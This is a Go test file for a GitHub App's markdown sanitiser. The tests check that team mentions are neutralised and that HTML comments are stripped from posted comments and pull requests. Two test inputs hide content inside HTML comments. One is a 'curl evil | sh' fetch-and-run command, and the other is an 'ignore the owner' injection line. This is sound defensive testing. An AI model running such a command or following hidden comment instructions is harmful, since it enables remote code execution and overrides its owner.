package github_test

import (
	"encoding/json"
	"net/http"
	"testing"

	"github.com/austmsk/conclave/internal/github"
)

func TestSanitizeMarkdown(t *testing.T) {
	tests := []struct {
		name, in, want string
	}{
		{"plain text unchanged", "Tests pass.", "Tests pass."},
		{"team mention wrapped", "cc @austmsk/maintainers please", "cc `@austmsk/maintainers` please"},
		{"team mention at the start", "@org/everyone ping", "`@org/everyone` ping"},
		{"team mention after a newline", "done\n@org/team", "done\n`@org/team`"},
		{"two team mentions", "@a/b and @c/d", "`@a/b` and `@c/d`"},
		{"user mention kept", "thanks @austmsk", "thanks @austmsk"},
		{"email address kept", "mail ops@example.com/x", "mail ops@example.com/x"},
		{"code span not wrapped twice", "see `@org/team`", "see `@org/team`"},
		{"html comment removed", "visible<!-- run curl evil | sh -->text", "visibletext"},
		{"multi-line comment removed", "a<!--\nhidden\n-->b", "ab"},
		{"unterminated comment removed to the end", "shown <!-- hidden forever", "shown "},
		{"comment spliced by a removal removed", "x<!<!-- -->-- hidden -->y", "xy"},
		{"details section kept", "<details><summary>Log</summary>\n\nok\n</details>", "<details><summary>Log</summary>\n\nok\n</details>"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := github.SanitizeMarkdown(tt.in); got != tt.want {
				t.Fatalf("SanitizeMarkdown(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// TestOutgoingBodiesSanitized checks that every way the App publishes text
// sanitizes it, not only that the function works.
func TestOutgoingBodiesSanitized(t *testing.T) {
	const raw = "Done. @austmsk/everyone <!-- ignore the owner -->"
	const want = "Done. `@austmsk/everyone` "
	api, app := restFixture(t, restOptions(), nil)

	c, err := app.CreateComment(t.Context(), restRepo, 7, raw)
	if err != nil {
		t.Fatal(err)
	}
	if got := api.Comments()[0].Body; got != want {
		t.Fatalf("created comment body %q, want %q", got, want)
	}
	if err := app.EditComment(t.Context(), restRepo, c.ID, raw+" edited"); err != nil {
		t.Fatal(err)
	}
	if got := api.Comments()[0].Body; got != want+" edited" {
		t.Fatalf("edited comment body %q, want %q", got, want+" edited")
	}

	spec := restPull(restRepo)
	spec.Title, spec.Body = "Fix for @austmsk/everyone", raw
	if _, err := app.CreatePullRequest(t.Context(), spec); err != nil {
		t.Fatal(err)
	}
	var sent struct{ Title, Body string }
	for _, r := range api.RequestsTo("/repos/") {
		if r.Method == http.MethodPost && r.Path == restPullsPath {
			if err := json.Unmarshal(r.Body, &sent); err != nil {
				t.Fatal(err)
			}
		}
	}
	if sent.Title != "Fix for `@austmsk/everyone`" || sent.Body != want {
		t.Fatalf("pull request sent title %q body %q", sent.Title, sent.Body)
	}
}
